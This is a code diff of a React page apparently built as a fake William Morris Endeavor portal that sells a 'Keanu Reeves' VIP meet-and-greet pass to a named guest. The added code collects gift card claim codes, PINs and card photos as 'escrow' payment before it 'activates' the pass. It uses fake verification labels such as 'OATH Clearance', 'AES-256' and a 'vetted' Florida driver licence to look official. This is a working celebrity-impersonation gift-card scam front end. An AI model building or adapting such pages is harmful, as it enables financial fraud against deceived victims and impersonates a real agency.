+                                cardAmountInput === String(remainingBalance)
+                                  ? 'bg-[#713B45] text-white font-semibold'
+                                  : 'bg-[#F8F7F4] text-[#252525] border border-[#E3E0DC] hover:border-[#713B45]'
+                              }`}
+                            >
+                              Exact Due (${remainingBalance})
+                            </button>
+                          )}
+                        </div>
+                      </div>
+
+                      {/* Card Provider & Amount Fields */}
+                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                        <div>
+                          <label htmlFor="giftCardTypeSelect" className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
+                            Card Provider
+                          </label>
+                          <select
+                            id="giftCardTypeSelect"
+                            value={selectedGiftCardType}
+                            onChange={(e) => setSelectedGiftCardType(e.target.value)}
+                            className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] text-xs font-sans text-[#252525] rounded-[2px] py-2 px-3 focus:outline-none"
+                          >
+                            {(pricing.acceptedGiftCards || []).map((provider) => (
+                              <option key={provider} value={provider}>
+                                {provider}
+                              </option>
+                            ))}
+                          </select>
+                        </div>
+
+                        <div>
+                          <label htmlFor="cardAmountInput" className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
+                            Voucher Amount ($ USD)
+                          </label>
+                          <div className="relative">
+                            <span className="absolute left-3 top-2 text-xs font-mono text-[#737373]">$</span>
+                            <input
+                              id="cardAmountInput"
+                              type="number"
+                              min="1"
+                              max="1000"
+                              value={cardAmountInput}
+                              onChange={(e) => setCardAmountInput(e.target.value)}
+                              placeholder="250"
+                              className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] text-xs font-mono text-[#252525] pl-7 pr-3 py-2 rounded-[2px] focus:outline-none"
+                            />
+                          </div>
+                        </div>
+                      </div>
+
+                      {/* Claim Code Input */}
+                      <div>
+                        <label htmlFor="giftCardCodeInput" className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
+                          Gift Card Claim Code / Serial Number
+                        </label>
+                        <input
+                          id="giftCardCodeInput"
+                          type="text"
+                          value={giftCardCodeInput}
+                          onChange={(e) => {
+                            setGiftCardCodeInput(e.target.value);
+                            if (paymentError) setPaymentError('');
+                          }}
+                          placeholder="e.g. X7KM-92NQ-48PL-2026"
+                          autoComplete="off"
+                          className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] text-xs font-mono text-[#252525] placeholder-[#9CA3AF] rounded-[2px] py-2.5 px-3 focus:outline-none uppercase tracking-wider"
+                        />
+                      </div>
+
+                      {/* Card PIN / CVV */}
+                      <div>
+                        <label htmlFor="giftCardPinInput" className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
+                          Card PIN / CVV (If Applicable)
+                        </label>
+                        <input
+                          id="giftCardPinInput"
+                          type="text"
+                          value={giftCardPinInput}
+                          onChange={(e) => setGiftCardPinInput(e.target.value)}
+                          placeholder="e.g. 8824 (optional)"
+                          maxLength={8}
+                          className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] text-xs font-mono text-[#252525] placeholder-[#9CA3AF] rounded-[2px] py-2 px-3 focus:outline-none"
+                        />
+                      </div>
+
+                      {/* Voucher Photo Scan Upload */}
+                      <div>
+                        <label className="text-[11px] font-mono text-[#737373] uppercase flex items-center gap-1 mb-1">
+                          <Camera className="w-3.5 h-3.5 text-[#713B45]" />
+                          <span>Voucher Photo Scan / Digital Proof</span>
+                        </label>
+
+                        {!giftCardImage ? (
+                          <label className="border border-dashed border-[#D1D5DB] hover:border-[#713B45] bg-[#F8F7F4] hover:bg-[#FFFFFF] rounded-[2px] p-3.5 flex flex-col items-center justify-center cursor-pointer transition-colors">
+                            <input
+                              type="file"
+                              id="giftCardFileInput"
+                              accept="image/*"
+                              onChange={handleImageFileChange}
+                              className="hidden"
+                            />
+                            <UploadCloud className="w-5 h-5 text-[#737373] mb-1" />
+                            <span className="text-xs font-medium text-[#252525]">
+                              Upload Voucher Front/Back Photo or Receipt
+                            </span>
+                            <span className="text-[11px] text-[#737373] mt-0.5">
+                              PNG, JPG, or PDF up to 10MB
+                            </span>
+                          </label>
+                        ) : (
+                          <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-2.5 flex items-center justify-between gap-3">
+                            <div 
+                              onClick={() => {
+                                setInspectModalImage(giftCardImage);
+                                setInspectModalTitle(giftCardImageName || 'Voucher Scan');
+                              }}
+                              className="flex items-center gap-2.5 cursor-pointer"
+                            >
+                              <div className="w-12 h-9 bg-white border border-[#E3E0DC] rounded overflow-hidden flex items-center justify-center shrink-0">
+                                <img
+                                  src={giftCardImage}
+                                  alt="Gift Card Attached"
+                                  className="w-full h-full object-cover"
+                                />
+                              </div>
+                              <div>
+                                <span className="text-xs font-mono text-[#252525] block font-semibold truncate max-w-[200px]">
+                                  {giftCardImageName || 'Voucher Scan Attached'}
+                                </span>
+                                <span className="text-[11px] font-sans text-[#065F46] flex items-center gap-1">
+                                  <CheckCircle2 className="w-3 h-3 text-[#10B981]" />
+                                  Scan Attached &bull; Click to Inspect
+                                </span>
+                              </div>
+                            </div>
+
+                            <button
+                              type="button"
+                              onClick={() => {
+                                setGiftCardImage(null);
+                                setGiftCardImageName('');
+                              }}
+                              className="p-1.5 text-[#737373] hover:text-[#DC2626] rounded transition-colors cursor-pointer"
+                              title="Remove image"
+                            >
+                              <Trash2 className="w-4 h-4" />
+                            </button>
+                          </div>
+                        )}
+                      </div>
+
+                      {paymentError && (
+                        <div className="p-3 bg-[#FEF2F2] border border-[#FCA5A5] rounded-[2px] flex items-start gap-2 text-xs text-[#991B1B]">
+                          <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-[#DC2626]" />
+                          <span>{paymentError}</span>
+                        </div>
+                      )}
+
+                      {paymentSuccessNotice && (
+                        <div className="p-3 bg-[#ECFDF5] border border-[#A7F3D0] rounded-[2px] flex items-start gap-2 text-xs text-[#065F46]">
+                          <CheckCircle2 className="w-4 h-4 shrink-0 mt-0.5 text-[#10B981]" />
+                          <span>{paymentSuccessNotice}</span>
+                        </div>
+                      )}
+
+                      <button
+                        type="button"
+                        id="submit-giftcard-btn"
+                        onClick={handleApplyVoucher}
+                        disabled={isSubmittingPayment || !giftCardCodeInput.trim()}
+                        className="w-full py-2.5 px-4 bg-[#252525] hover:bg-[#111111] disabled:opacity-40 text-white font-medium text-xs rounded-[2px] transition-colors flex items-center justify-center gap-2 cursor-pointer shadow-xs"
+                      >
+                        {isSubmittingPayment ? (
+                          <>
+                            <RotateCw className="w-3.5 h-3.5 animate-spin text-white" />
+                            <span>Verifying Voucher with Gateway...</span>
+                          </>
+                        ) : (
+                          <>
+                            <Plus className="w-3.5 h-3.5" />
+                            <span>Verify &amp; Apply Card (+${cardAmountInput || remainingBalance || 250} USD)</span>
+                          </>
+                        )}
+                      </button>
+                    </div>
+                  )}
+
+                  {activationError && (
+                    <div className="p-3 bg-[#FEF2F2] border border-[#FCA5A5] rounded-[2px] flex items-start gap-2 text-xs text-[#991B1B]">
+                      <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-[#DC2626]" />
+                      <span>{activationError}</span>
+                    </div>
+                  )}
+
+                  {/* Primary Activation Button */}
+                  {!isCardActivated && (
+                    <div className="pt-2 border-t border-[#E3E0DC]">
+                      <button
+                        type="button"
+                        id="submit-activate-btn"
+                        onClick={handleActivateCard}
+                        disabled={isActivating || !isPinValid || !isEscrowSatisfied}
+                        className={`w-full py-3.5 px-4 font-sans text-xs uppercase tracking-wider font-semibold rounded-[2px] shadow-xs transition-colors flex items-center justify-center gap-2 cursor-pointer ${
+                          isPinValid && isEscrowSatisfied
+                            ? 'bg-[#713B45] hover:bg-[#592E36] text-white'
+                            : 'bg-[#E5E7EB] text-[#9CA3AF] cursor-not-allowed'
+                        }`}
+                      >
+                        {isActivating ? (
+                          <>
+                            <RotateCw className="w-4 h-4 animate-spin text-white" />
+                            <span>Authenticating OATH Clearance...</span>
+                          </>
+                        ) : !isEscrowSatisfied ? (
+                          <span>Deposit Remaining Escrow (${remainingBalance}.00 Due) to Unlock</span>
+                        ) : (
+                          <>
+                            <ShieldCheck className="w-4 h-4" />
+                            <span>Authenticate PIN &amp; Activate VIP Card</span>
+                          </>
+                        )}
+                      </button>
+
+                      <p className="text-[11px] font-mono text-[#737373] text-center pt-2">
+                        Initiative for Open AuTHentication (OATH) &bull; RFC-4226 &amp; AES-256 VIP Standard
+                      </p>
+                    </div>
+                  )}
+                </div>
+              </div>
+
+              {/* Right Column: Credential Pass Visualizer & Admittance Rules */}
+              <div className="lg:col-span-5 space-y-6">
+                {/* 1. Credential Pass Visualizer Card */}
+                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs">
+                  <div className="flex items-center justify-between pb-3 border-b border-[#E3E0DC] mb-3">
+                    <h2 className="font-serif font-bold text-base text-[#252525]">
+                      Credential Pass Document
+                    </h2>
+                    <span className="text-[11px] font-mono text-[#737373]">
+                      Ref: WME-KR26-0813-VIP
+                    </span>
+                  </div>
+
+                  {/* Tab Selector: Front / Back / Both */}
+                  <div className="flex items-center gap-1 p-1 bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] mb-3 text-xs font-sans">
+                    <button
+                      type="button"
+                      onClick={() => setBadgeFace('front')}
+                      className={`flex-1 py-1.5 text-center font-medium rounded-[2px] transition-colors cursor-pointer ${
+                        badgeFace === 'front' 
+                          ? 'bg-[#FFFFFF] text-[#713B45] shadow-xs font-semibold' 
+                          : 'text-[#737373] hover:text-[#252525]'
+                      }`}
+                    >
+                      Front Face
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => setBadgeFace('back')}
+                      className={`flex-1 py-1.5 text-center font-medium rounded-[2px] transition-colors cursor-pointer ${
+                        badgeFace === 'back' 
+                          ? 'bg-[#FFFFFF] text-[#713B45] shadow-xs font-semibold' 
+                          : 'text-[#737373] hover:text-[#252525]'
+                      }`}
+                    >
+                      Back Face
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => setBadgeFace('complete')}
+                      className={`flex-1 py-1.5 text-center font-medium rounded-[2px] transition-colors cursor-pointer ${
+                        badgeFace === 'complete' 
+                          ? 'bg-[#FFFFFF] text-[#713B45] shadow-xs font-semibold' 
+                          : 'text-[#737373] hover:text-[#252525]'
+                      }`}
+                    >
+                      Complete Sheet
+                    </button>
+                  </div>
+
+                  {/* Badge Image Frame */}
+                  <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-2 flex items-center justify-center overflow-hidden">
+                    <img
+                      src={badgeFace === 'front' ? frontImg : badgeFace === 'back' ? backImg : completeImg}
+                      alt={`Brenda Wright VIP Pass ${badgeFace}`}
+                      className="w-full max-h-[420px] object-contain rounded-[2px] shadow-xs cursor-pointer hover:opacity-95 transition-opacity"
+                      onClick={() => setBadgeFace(badgeFace === 'front' ? 'back' : 'front')}
+                      title="Click badge to flip"
+                    />
+                  </div>
+
+                  <p className="text-[11px] text-[#737373] text-center mt-2 italic font-sans">
+                    Click badge image to flip between Front and Back security faces.
+                  </p>
+
+                  {/* Direct Document Downloads */}
+                  <div className="pt-3 border-t border-[#E3E0DC] mt-3 grid grid-cols-2 gap-2 text-xs font-sans">
                     <button
                       type="button"
                       onClick={() => triggerDirectDownload(pdfFile, 'Brenda-Wright-VIP-Meet-Greet-Pass.pdf')}
-                      className="w-full py-3 bg-[#D4AF37] text-black font-mono text-xs uppercase tracking-wider font-semibold rounded-[2px] hover:bg-[#F3E5AB] transition-colors flex items-center justify-center gap-1.5 cursor-pointer shadow-md"
+                      className="col-span-2 py-2 px-3 bg-[#713B45] hover:bg-[#592E36] text-white font-medium rounded-[2px] transition-colors flex items-center justify-center gap-1.5 cursor-pointer shadow-xs"
                     >
                       <Download className="w-3.5 h-3.5" />
-                      <span>Download Printable VIP Pass (PDF)</span>
+                      <span>Download Official PDF Document</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => triggerDirectDownload(frontImg, 'Brenda-Wright-VIP-Pass-Front.png')}
+                      className="py-1.5 px-2.5 bg-[#FFFFFF] border border-[#D1D5DB] hover:border-[#713B45] text-[#252525] rounded-[2px] text-center cursor-pointer"
+                    >
+                      Front Face (PNG)
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => triggerDirectDownload(backImg, 'Brenda-Wright-VIP-Pass-Back.png')}
+                      className="py-1.5 px-2.5 bg-[#FFFFFF] border border-[#D1D5DB] hover:border-[#713B45] text-[#252525] rounded-[2px] text-center cursor-pointer"
+                    >
+                      Back Face (PNG)
                     </button>
                   </div>
                 </div>
-              )}
-            </div>
 
-            {/* Venue Admittance Rules */}
-            <div className="p-4 bg-[#0A0A10] border border-[#1E1E28] rounded-[2px] space-y-2 text-[11px] text-[#888899] font-mono">
-              <span className="text-[#D4AF37] block font-semibold uppercase tracking-wider text-[10px]">
-                Admittance Requirements:
-              </span>
-              <ul className="list-disc pl-4 space-y-1">
-                <li>Government-issued Florida photo ID required upon talent lounge check-in.</li>
-                <li>Credential pass must be presented digitally or in printed high-res format.</li>
-                <li>Single admittance strictly non-transferable under WME talent rider terms.</li>
-              </ul>
-            </div>
-
-          </div>
-
-          {/* Right Column: Interactive Credential Pass Display & Direct Downloads (6 Cols) */}
-          <div className="lg:col-span-6 space-y-4">
-            
-            {/* Download and Flip Controls Bar */}
-            <div className="flex flex-wrap items-center justify-between gap-2 p-3 bg-[#111118] border border-[#242433] rounded-[3px]">
-              <div className="flex items-center gap-2">
-                <button
-                  type="button"
-                  onClick={() => setIsFlipped(!isFlipped)}
-                  className="px-3 py-1.5 bg-[#D4AF37] hover:bg-[#F3E5AB] text-black font-mono text-xs font-semibold uppercase tracking-wider rounded-[2px] flex items-center gap-1.5 transition-colors cursor-pointer"
-                >
-                  <RotateCw className="w-3.5 h-3.5" />
-                  <span>{isFlipped ? 'Show Front Face' : 'Show Back Face'}</span>
-                </button>
-                <span className="text-[11px] font-mono text-[#888899] hidden sm:inline">
-                  (Currently: {isFlipped ? 'Back Face' : 'Front Face'})
-                </span>
-              </div>
-
-              <div className="flex flex-wrap items-center gap-2">
-                <button
-                  type="button"
-                  onClick={() => triggerDirectDownload(frontImg, 'Brenda-Wright-VIP-Pass-Front.png')}
-                  className="px-2.5 py-1.5 bg-[#1C1C26] hover:bg-[#2A2A3A] text-white border border-[#333344] font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors"
-                  title="Download High-Res Front Pass PNG"
-                >
-                  <Download className="w-3 h-3 text-[#D4AF37]" />
-                  <span>Front</span>
-                </button>
-                <button
-                  type="button"
-                  onClick={() => triggerDirectDownload(backImg, 'Brenda-Wright-VIP-Pass-Back.png')}
-                  className="px-2.5 py-1.5 bg-[#1C1C26] hover:bg-[#2A2A3A] text-white border border-[#333344] font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors"
-                  title="Download High-Res Back Pass PNG"
-                >
-                  <Download className="w-3 h-3 text-[#D4AF37]" />
-                  <span>Back</span>
-                </button>
-                <button
-                  type="button"
-                  onClick={() => triggerDirectDownload(completeImg, 'Brenda-Wright-VIP-Pass-Complete.png')}
-                  className="px-2.5 py-1.5 bg-[#1C1C26] hover:bg-[#2A2A3A] text-white border border-[#333344] font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors"
-                  title="Download Side-by-Side Presentation PNG"
-                >
-                  <Download className="w-3 h-3 text-[#D4AF37]" />
-                  <span>Both</span>
-                </button>
-                <button
-                  type="button"
-                  onClick={() => triggerDirectDownload(pdfFile, 'Brenda-Wright-VIP-Meet-Greet-Pass.pdf')}
-                  className="px-2.5 py-1.5 bg-[#6B1D2F] hover:bg-[#8A253D] text-white border border-[#A6304C]/40 font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors font-semibold"
-                  title="Download Printable 300 DPI PDF"
-                >
-                  <FileText className="w-3 h-3" />
-                  <span>PDF</span>
-                </button>
-              </div>
-            </div>
-
-            {/* Credential Image Display with Glow Frame */}
-            <div 
-              onClick={() => setIsFlipped(!isFlipped)} 
-              className="bg-[#050508] border-2 border-[#D4AF37]/40 rounded-[6px] p-4 flex flex-col items-center justify-center shadow-2xl relative cursor-pointer group hover:border-[#D4AF37] transition-all min-h-[580px]"
-            >
-              <div className="absolute top-3 left-4 flex items-center gap-2 text-[10px] font-mono text-[#A1A1AA]">
-                <span className="w-2 h-2 rounded-full bg-[#D4AF37]" />
-                <span>CLICK BADGE TO FLIP</span>
-              </div>
-
-              {isCardActivated && (
-                <div className="absolute top-3 right-4 bg-[#22C55E]/20 border border-[#22C55E] text-[#4ADE80] font-mono text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded-[2px] flex items-center gap-1 animate-pulse">
-                  <CheckCircle2 className="w-3 h-3" />
-                  <span>ACTIVATED &amp; SYNCED</span>
+                {/* 2. Venue Admittance Rules Card */}
+                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs space-y-2.5 text-xs text-[#737373] font-sans">
+                  <h3 className="font-serif font-bold text-sm text-[#252525]">
+                    Venue Admittance Protocol &bull; Keanu Reeves Green Room
+                  </h3>
+                  <ul className="space-y-1.5 list-disc list-inside leading-relaxed">
+                    <li>Government-issued Florida photo ID required upon talent lounge check-in.</li>
+                    <li>Credential pass must be presented digitally or in printed high-res format.</li>
+                    <li>Single admittance strictly non-transferable under WME talent rider terms.</li>
+                    <li>Designated intake escort call time: <strong>Tuesday, Nov 3, 2026 at 19:30 PST</strong>.</li>
+                  </ul>
                 </div>
-              )}
-
-              {/* Pass Image */}
-              <div className="relative max-w-[420px] w-full flex items-center justify-center py-2">
-                <img
-                  src={isFlipped ? backImg : frontImg}
-                  alt={`Brenda Wright VIP Pass ${isFlipped ? 'Back' : 'Front'}`}
-                  className="max-h-[640px] w-auto object-contain rounded-[4px] shadow-2xl border border-white/10 group-hover:scale-[1.01] transition-transform duration-300"
-                />
-              </div>
-
-              <div className="mt-3 text-center">
-                <span className="text-[11px] font-mono text-[#888899]">
-                  {isFlipped 
-                    ? 'Back Face: Activation PIN Security Module, Barcode, Terms & Passholder Dedication' 
-                    : 'Front Face: Keanu Reeves Designated Guest, Photo Verified, Digital E-Sign & Scannable QR'}
-                </span>
               </div>
             </div>
-
           </div>
-
-        </div>
+        )}
       </main>
 
-      {/* Florida Driver License Modal Lightbox */}
+      {/* 3. Footer: Traditional WME Agency Tagline */}
+      <footer className="border-t border-[#E3E0DC] bg-[#FFFFFF] py-4 text-center text-xs text-[#737373] font-sans">
+        <div className="max-w-6xl mx-auto px-4">
+          William Morris Endeavor (WME) &bull; Talent Relations &amp; VIP Accreditation Division &bull; Beverly Hills, CA
+        </div>
+      </footer>
+
+      {/* Lightbox Modal: Florida Driver License Inspection */}
       {showIdModal && (
         <div 
-          role="dialog"
-          aria-modal="true"
-          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4"
+          className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4 backdrop-blur-xs"
+          onClick={() => setShowIdModal(false)}
         >
-          <div className="bg-[#111116] border border-[#D4AF37] rounded-[4px] max-w-lg w-full p-5 shadow-2xl relative">
-            <button
-              type="button"
-              onClick={() => setShowIdModal(false)}
-              className="absolute top-3.5 right-3.5 text-[#A1A1AA] hover:text-white p-1 cursor-pointer"
-              title="Close modal"
-            >
-              <X className="w-5 h-5" />
-            </button>
-
-            <div className="flex items-center gap-2 mb-2 text-[#D4AF37]">
-              <CreditCard className="w-4 h-4" />
-              <h3 className="font-mono text-xs uppercase tracking-wider font-bold">
-                Florida Driver License Intake Verification
+          <div 
+            className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] max-w-lg w-full p-5 space-y-3 shadow-lg"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <div className="flex items-center justify-between pb-2 border-b border-[#E3E0DC]">
+              <h3 className="font-serif font-bold text-base text-[#252525]">
+                Verified Government Identification Document
               </h3>
-            </div>
-            <p className="text-[11px] font-mono text-[#888899] mb-4">
-              Passholder: Brenda Wright • Jurisdiction: Florida, USA • Status: AES-256 Encrypted
-            </p>
-
-            <div className="bg-[#050508] p-2 rounded-[2px] border border-white/10 flex items-center justify-center mb-4">
-              <img
-                src={licenseImg}
-                alt="Florida Driver License Full Intake"
-                className="max-h-[380px] w-auto object-contain rounded-[2px]"
-              />
-            </div>
-
-            <div className="flex items-center justify-between pt-2 border-t border-[#20202E] text-[11px] font-mono">
-              <span className="text-[#A1A1AA]">Validated &amp; Biometrically Matched</span>
               <button
                 type="button"
                 onClick={() => setShowIdModal(false)}
-                className="px-3 py-1 bg-[#D4AF37] text-black font-semibold uppercase text-xs rounded-[2px] cursor-pointer"
+                className="p-1 text-[#737373] hover:text-[#252525] cursor-pointer"
               >
-                Done
+                <X className="w-5 h-5" />
               </button>
             </div>
-          </div>
-        </div>
-      )}
 
-      {/* High-Resolution Voucher / Gift Card Modal Lightbox */}
-      {inspectModalImage && (
-        <div 
-          role="dialog"
-          aria-modal="true"
-          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4"
-        >
-          <div className="bg-[#111116] border border-[#D4AF37] rounded-[4px] max-w-xl w-full p-5 shadow-2xl relative">
-            <button
-              type="button"
-              onClick={() => setInspectModalImage(null)}
-              className="absolute top-3.5 right-3.5 text-[#A1A1AA] hover:text-white p-1 cursor-pointer"
-              title="Close modal"
-            >
-              <X className="w-5 h-5" />
-            </button>
-
-            <div className="flex items-center gap-2 mb-2 text-[#D4AF37]">
-              <Gift className="w-4 h-4" />
-              <h3 className="font-mono text-xs uppercase tracking-wider font-bold">
-                {inspectModalTitle || 'Voucher Scan Verification Proof'}
-              </h3>
-            </div>
-            <p className="text-[11px] font-mono text-[#888899] mb-4">
-              Passholder: {params.guest} • Security Ref: {params.ref}
-            </p>
-
-            <div className="bg-[#050508] p-2 rounded-[2px] border border-white/10 flex items-center justify-center mb-4 overflow-hidden">
+            <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-2 flex items-center justify-center overflow-hidden">
               <img
-                src={inspectModalImage}
-                alt="Voucher Verification Scan"
-                className="max-h-[420px] w-auto max-w-full object-contain rounded-[2px]"
+                src={licenseImg}
+                alt="Florida Driver License"
+                className="w-full max-h-[360px] object-contain rounded-[2px]"
               />
             </div>
 
-            <div className="flex items-center justify-between pt-2 border-t border-[#20202E] text-[11px] font-mono">
-              <span className="text-[#A1A1AA]">
-                Verified Digital Asset on File
-              </span>
-              <button
-                type="button"
-                onClick={() => setInspectModalImage(null)}
-                className="px-3 py-1 bg-[#D4AF37] text-black font-semibold uppercase text-xs rounded-[2px] cursor-pointer"
-              >
-                Close
-              </button>
+            <div className="text-xs text-[#737373] font-sans space-y-1">
+              <div>Passholder: <strong>{params.guest}</strong> &bull; Document: <strong>Florida Driver License</strong></div>
+              <div>Verification Status: <span className="text-[#065F46] font-semibold">Vetted by WME Talent Relations</span></div>
             </div>
+
+            <button
+              type="button"
+              onClick={() => setShowIdModal(false)}
+              className="w-full py-2 bg-[#F8F7F4] border border-[#D1D5DB] hover:bg-[#E5E7EB] text-[#252525] text-xs font-medium rounded-[2px] cursor-pointer"
+            >
+              Close Document
+            </button>
           </div>
         </div>
       )}
 
-      {/* Footer */}
-      <footer className="border-t border-[#1C1C24] bg-[#0A0A0E] py-4 text-center text-[10px] font-mono text-[#666677]">
-        WILLIAM MORRIS ENDEAVOR (WME) • TALENT RELATIONS &amp; VIP ACCREDITATION DIVISION • BEVERLY HILLS, CA
-      </footer>
+      {/* Lightbox Modal: Gift Card Proof Inspection */}
+      {inspectModalImage && (
+        <div 
+          className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4 backdrop-blur-xs"
+          onClick={() => setInspectModalImage(null)}
+        >
+          <div 
+            className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] max-w-lg w-full p-5 space-y-3 shadow-lg"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <div className="flex items-center justify-between pb-2 border-b border-[#E3E0DC]">
+              <h3 className="font-serif font-bold text-base text-[#252525]">
+                {inspectModalTitle || 'Voucher Scan Document'}
+              </h3>
+              <button
+                type="button"
+                onClick={() => setInspectModalImage(null)}
+                className="p-1 text-[#737373] hover:text-[#252525] cursor-pointer"
+              >
+                <X className="w-5 h-5" />
+              </button>
+            </div>
+
+            <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-2 flex items-center justify-center overflow-hidden">
+              <img
+                src={inspectModalImage}
+                alt="Voucher Scan Proof"
+                className="w-full max-h-[380px] object-contain rounded-[2px]"
+              />
+            </div>
+
+            <button
+              type="button"
+              onClick={() => setInspectModalImage(null)}
+              className="w-full py-2 bg-[#F8F7F4] border border-[#D1D5DB] hover:bg-[#E5E7EB] text-[#252525] text-xs font-medium rounded-[2px] cursor-pointer"
+            >
+              Close Proof Scan
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
-
-export default CardActivationPortal;
